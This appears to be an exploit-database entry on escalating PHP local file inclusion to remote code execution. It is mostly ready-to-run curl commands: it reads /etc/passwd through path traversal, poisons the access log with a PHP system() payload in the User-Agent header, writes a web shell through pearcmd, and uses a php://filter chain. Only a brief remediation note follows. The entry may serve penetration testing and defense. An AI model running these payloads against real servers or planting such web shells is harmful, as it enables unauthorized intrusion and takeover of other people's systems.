---
id: "lfi-to-rce"
title: "Local file inclusion → RCE (log inclusion / pearcmd / PHP filter chain)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "critical"
cvss: 9
severity-basis: "cvss"
severity-note: null
product: "PHP applications (user input passed to include/require)"
versions: "Any"
ports: "80, 443"
keywords: "lfi, file inclusion, log inclusion, pearcmd, filter chain, rce"
entry: "Inclusion parameters such as ?page=  ?file=  ?lang="
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /index.php?page=about        → renders normally
GET /index.php?page=../../../../etc/passwd → returns root:x:0:0
```

## Prerequisites

- An inclusion parameter exists without path filtering; PHP environment.

## PoC

```bash
# 1) Confirm LFI
curl -s 'https://target/index.php?page=../../../../etc/passwd' | head -3

# 2) Log inclusion (most widely applicable): write PHP into access.log first
curl -s 'https://target/' -A '<?php system($_GET[1]); ?>' -o /dev/null
curl -s 'https://target/index.php?page=/var/log/nginx/access.log&1=id' | grep -o 'uid=[^ <]*'
# Result: uid= appears = RCE

# 3) Write a web shell using pearcmd (common in images with pear installed)
curl -s 'https://target/index.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_GET[1]);?>+/tmp/s.php'
curl -s 'https://target/index.php?page=/tmp/s.php&1=phpinfo();'

# 4) Fileless inclusion RCE: php://filter chain (generate arbitrary content)
python3 -m pip install php-filter-chain 2>/dev/null || true
#   php_filter_chain_generator.py --chain '<?php system("id");?>' > chain.txt
```

## Exploitation Steps

1. Confirm by reading `/etc/passwd` first;
2. Log inclusion is the most reliable (write the UA first, then include it);
3. Write a temporary web shell using pearcmd, or execute directly with a filter chain;
4. Evidence: returned uid= / file contents.

## Remediation and Mitigation

- Map inclusion parameters through an allowlist; use `open_basedir`; disable allow_url_include.

## References

- OWASP LFI/RFI; PHP filter chain research.
